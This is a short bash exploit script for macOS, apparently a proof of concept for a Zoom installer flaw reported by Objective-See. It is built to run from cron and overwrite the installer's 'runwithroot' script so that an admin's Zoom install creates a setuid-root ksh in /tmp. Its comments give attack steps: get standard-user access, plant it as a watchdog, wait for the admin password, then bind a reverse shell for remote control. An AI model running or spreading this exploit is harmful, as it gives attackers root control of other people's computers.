#!/bin/bash

#This is Zoot, Zoom->Root - some code for Objective-See's findings:
#https://objective-see.com/blog/blog_0x56.html
#Asterisk * signifies the probabilistic portion of the file path. 
#All named files are pre-determined. 
#---------------------------------------#
#Instructions: gain standard-user access on a Mac OSX box. Drop this phile 
#in the cron jobs as a watchdog. 
#7h3n w8 f0r 4dm1n 2 1nst4ll Z00m and 3nt3r d3r p4ssw0rd... r00t
#It might be best to bind a reverse shell to the new /tmp/ksh 
#so that you can h4x fr0m afar.

HAQPATH="/private/var/folders/03/*/T/com.apple.install.*/runwithroot"
HAQPATH2="/private/var/folders/vb/*/T/com.apple.install.*/runwithroot"
HAQ="cp /bin/ksh /tmp;chown root:wheel /tmp/ksh;chmod u+s /tmp/ksh;open /tmp/ksh"

if [ $(ls -1A $HAQPATH | wc -l) > 0 ]
then
        echo $HAQ > $HAQPATH
fi

if [ $(ls -1A $HAQPATH2 | wc -l) > 0 ]
then
        echo $HAQ > $HAQPATH2
fi
